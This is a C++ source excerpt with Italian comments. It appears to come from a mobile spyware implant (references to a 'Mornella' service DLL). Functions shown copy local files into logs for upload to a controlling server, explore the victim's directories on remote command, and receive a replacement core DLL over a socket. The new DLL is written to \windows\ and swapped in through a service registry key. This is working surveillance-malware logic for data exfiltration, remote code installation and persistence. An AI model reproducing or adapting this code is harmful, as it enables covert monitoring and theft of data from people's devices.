	UINT uAdditionalLen = sizeof(LogDownload) + LogFileData.uFileNameLen;
	pBuf = new(std::nothrow) BYTE[uAdditionalLen];

	if (pBuf == NULL)
		return FALSE;

	hLocalFile = _CreateFileW(strPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hLocalFile == INVALID_HANDLE_VALUE) {
		delete[] pBuf;
		return FALSE;
	}

	// Creiamo l'Additional Data
	ZeroMemory(pBuf, uAdditionalLen);
	CopyMemory(pBuf, &LogFileData, sizeof(LogDownload));
	CopyMemory(pBuf + sizeof(LogDownload), (PBYTE)(strObscuredPath.c_str()), LogFileData.uFileNameLen);

	if (log.CreateLog(LOGTYPE_DOWNLOAD, pBuf, uAdditionalLen, MMC1) == FALSE) {
		delete[] pBuf;
		CloseHandle(hLocalFile);
		return FALSE;
	}

	delete[] pBuf;

	// Mappiamo il file in memoria e scriviamolo nel log
	DWORD dwHigh, dwFileSize = _GetFileSize(hLocalFile, &dwHigh);

	// Per qualche ragione, non riusciamo ad accedere piu' al file
	if (dwFileSize == 0xFFFFFFFF && GetLastError() != NO_ERROR) {
		log.CloseLog(TRUE);
		CloseHandle(hLocalFile);
		return FALSE;
	}

	// Se il file e' troppo grosso (> 100Mb), evitiamo di inviarlo
	if (dwFileSize > 50 * 1024 * 1024) {
		log.CloseLog(TRUE);
		CloseHandle(hLocalFile);
		return FALSE;
	}

	pBuf = new(std::nothrow) BYTE[256 * 1024 + 1];

	if (pBuf == NULL) {
		log.CloseLog(TRUE);
		CloseHandle(hLocalFile);
		return FALSE;
	}

#define CHUNK_SIZE 256 * 1024

	while (dwFileSize) {
		DWORD dwRead = 0;
		UINT uChunk;

		// Leggiamo a chunk di 256kb
		if (dwFileSize > CHUNK_SIZE)
			uChunk = CHUNK_SIZE;
		else
			uChunk = dwFileSize;

		if (ReadFile(hLocalFile, pBuf, uChunk, &dwRead, NULL) == FALSE) {
			delete[] pBuf;
			log.CloseLog(TRUE);
			CloseHandle(hLocalFile);
			return FALSE;
		}

		log.WriteLog(pBuf, dwRead);
		dwFileSize -= dwRead;
	}

	delete[] pBuf;
	log.CloseLog();
	CloseHandle(hLocalFile);
	
	return TRUE;
}

BOOL Transfer::SendFileSystem(SOCKET s) {
	
	UINT uDepth, uPathLen;
	WCHAR *pwSearch = NULL;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	Explorer exp;

	if (s == NULL || s == INVALID_SOCKET) {
		DBG_TRACE(L"Debug - Transfer.cpp - SendFileSystem() [Invalid Socket]\n", 5, FALSE);
		return FALSE;
	}

	// Spediamo l'OK al server per confermare che siamo pronti
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
		return FALSE;

	// Riceviamo la profondita' di ricerca
	if (RecvData(s, (BYTE *)&uDepth, sizeof(uDepth)) == SOCKET_ERROR)
		return FALSE;

	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
		return FALSE;

	// Riceviamo la lunghezza del path
	if (RecvData(s, (BYTE *)&uPathLen, sizeof(uDepth)) == SOCKET_ERROR)
		return FALSE;

	if (uPathLen == 0)
		return FALSE;

	// La search string e' NULL-terminata, ma per sicurezza allochiamo un WCHAR in piu'
	pwSearch = new(std::nothrow) WCHAR[(uPathLen / sizeof(WCHAR)) + 1];

	if (pwSearch == NULL)
		return FALSE;

	ZeroMemory(pwSearch, uPathLen + sizeof(WCHAR));

	// Spediamo l'OK al server per confermare che possiamo ricevere la stringa
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		delete[] pwSearch;
		return FALSE;
	}

	// Riceviamo la search string
	if (RecvData(s, (BYTE *)pwSearch, uPathLen) == SOCKET_ERROR) {
		delete[] pwSearch;
		return FALSE;
	}

	// Spediamo l'OK al server per confermare la ricezione della stringa
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		delete[] pwSearch;
		return FALSE;
	}

	// XXX dovremmo espandere le env-variables in futuro...
	if (uDepth > 10)
		uDepth = 10;

	exp.ExploreDirectory(pwSearch, uDepth);
	delete[] pwSearch;
	
	return TRUE;
}

BOOL Transfer::GetUpgrade(SOCKET s) {
	
	UINT uFileLen;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	wstring strNewCore, strPathName;
	BYTE *pFile = NULL;
	DWORD dwWritten = 0;

	if (s == NULL || s == INVALID_SOCKET) {
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [0]\n", 5, FALSE);
		return FALSE;
	}

	// Spediamo l'OK al server per confermare che siamo pronti
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [1]\n", 5, FALSE);
		return FALSE;
	}

	// Riceviamo la lunghezza del file
	if (RecvData(s, (BYTE *)&uFileLen, sizeof(uFileLen)) == SOCKET_ERROR) {
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [2]\n", 5, FALSE);
		return FALSE;
	}

	if (uFileLen == 0) {
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [3]\n", 5, FALSE);
		return FALSE;
	}

	pFile = new(std::nothrow) BYTE[uFileLen];

	if (pFile == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [4]\n", 5, FALSE);
		return FALSE;
	}

	// Confermiamo l'avvenuta ricezione della lunghezza del file
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		delete[] pFile;
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [5]\n", 5, FALSE);
		return FALSE;
	}

	// Riceviamo il file
	if (RecvData(s, (BYTE *)pFile, uFileLen) == SOCKET_ERROR) {
		ZeroMemory(pFile, uFileLen);
		delete[] pFile;
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [6]\n", 5, FALSE);
		return FALSE;
	}

	// Se conosciamo il nostro nome, switchiamo il nuovo core
	strPathName = L"\\windows\\";

	if (g_strOurName.empty() == FALSE) {
		if (g_strOurName == MORNELLA_SERVICE_DLL_A)
			strPathName += MORNELLA_SERVICE_DLL_B;
		else
			strPathName += MORNELLA_SERVICE_DLL_A;

		hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (hFile == INVALID_HANDLE_VALUE) {
			ZeroMemory(pFile, uFileLen);
			delete[] pFile;
			DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [7]\n", 5, FALSE);
			return FALSE;
		}
	} else { // Se non sappiamo qual'e' il nostro nome... Guessiamo
		strPathName += MORNELLA_SERVICE_DLL_A;

		hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if (hFile == INVALID_HANDLE_VALUE) {
			strPathName = L"\\windows\\";
			strPathName += MORNELLA_SERVICE_DLL_B;

			hFile = _CreateFileW(strPathName.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

			if (hFile == INVALID_HANDLE_VALUE) {
				ZeroMemory(pFile, uFileLen);
				delete[] pFile;
				DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [8]\n", 5, FALSE);
				return FALSE;
			}

			g_strOurName = MORNELLA_SERVICE_DLL_A;
		} else {
			g_strOurName = MORNELLA_SERVICE_DLL_B;
		}
	}

	if (g_strOurName == MORNELLA_SERVICE_DLL_A)
		strNewCore = MORNELLA_SERVICE_DLL_B;
	else
		strNewCore = MORNELLA_SERVICE_DLL_A;

	if (WriteFile(hFile, pFile, uFileLen, &dwWritten, NULL) == FALSE) {
		ZeroMemory(pFile, uFileLen);
		delete[] pFile;
		CloseHandle(hFile);
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [9]\n", 5, FALSE);
		return FALSE;
	}

	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	// Facciamo il wipe del contenuto del file
	ZeroMemory(pFile, uFileLen);
	delete[] pFile;

	// Scriviamo la chiave nel registro
	HKEY hKey;

	if (_RegOpenKeyExW(HKEY_LOCAL_MACHINE, MORNELLA_SERVICE_PATH, 0, 0, &hKey) != ERROR_SUCCESS) {
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [10] ", 5, TRUE);
		return FALSE;
	}

	// Aggiorniamo con il nome del nuovo core
	DWORD cbData = (strNewCore.size() * sizeof(WCHAR)) + sizeof(WCHAR);
	if (_RegSetValueEx(hKey, L"Dll", 0, REG_SZ, (BYTE *)strNewCore.c_str(), cbData) != ERROR_SUCCESS) {
		_RegCloseKey(hKey);
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [11] ", 5, TRUE);
		return FALSE;
	}

	_RegCloseKey(hKey);
	_RegFlushKey(HKEY_LOCAL_MACHINE);

	// Confermiamo l'avvenuta ricezione del nuovo core
	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR) {
		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [12]\n", 5, FALSE);
		return FALSE;
	}
	
	return TRUE;
}

void Transfer::ClearLogSnapshot() {
	
	if (uberlogObj == NULL || pSnap == NULL)
		return;

	uberlogObj->ClearListSnapshot(pSnap);

	pSnap = NULL;
	
}